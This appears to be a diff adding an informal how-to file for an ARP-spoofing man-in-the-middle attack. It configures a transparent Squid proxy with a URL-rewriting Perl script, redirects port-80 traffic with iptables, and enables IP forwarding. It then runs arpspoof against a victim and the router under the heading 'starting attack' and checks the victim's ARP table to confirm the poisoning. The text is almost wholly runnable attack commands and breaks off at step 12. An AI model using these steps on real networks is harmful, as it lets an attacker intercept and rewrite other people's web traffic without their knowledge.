@@ -1,0 +1,50 @@
+1) packages required:::::::
+       a) apt-get install squid3 -y
+       b) apt-get install apache2
+2) scripts required::::::::
+       a)apt-get -y install imagemagick ghostscript jp2a
+3) now download scripts like googleSearch.pl then::::
+       :::in terminal:::
+       a) nano googleSearch.pl
+       b) chmod +x googleSearch.pl
+
+4)configure squid::::
+       :::in terminal:::
+       a) nano /etc/squid/squid.conf
+      # now uncomment the following lines from page::::
+        1)acl localnet src 192.168.0.0/16
+        2)http_access allow localnet
+        5)http_port 3128 transparent                      //write transparent ...not there
+      # now go to the end of file. Now write           (esc -> shift+g) 
+         1) url_rewrite_program /root/googleSearch.pl
+
+5) restart squid:::
+           service squid3 restart
+
+6) :::in terminal:::
+           iptables -t nat -A PREROUTING -i eth0 -p tcp --destination-port 80 -j REDIRECT --to-port 3128
+
+7) :::in terminal:::
+            echo 1 > /proc/sys/net/ipv4/ip_forward
+
+
+8) apache configration::::
+            :::in terminal:::
+                   a) mkdir /var/www/tmp
+                    b) chmod 777 /var/www/tmp
+                      c) service apache2 restart
+
+9) starting attack::::
+            :::in terminal:::
+                     a) arpspoof -i eth0 -t router_IP -r victim_IP
+
+
+10) to check that windows has been arpspoofed::::
+          :::in cmd:::
+               arp -a           //mac of attcking computer will be same as router
+
+11) configure files by opening it ::::::::::
+       :::in terminal:::
+             nano googleSearch.pl
+
+12)
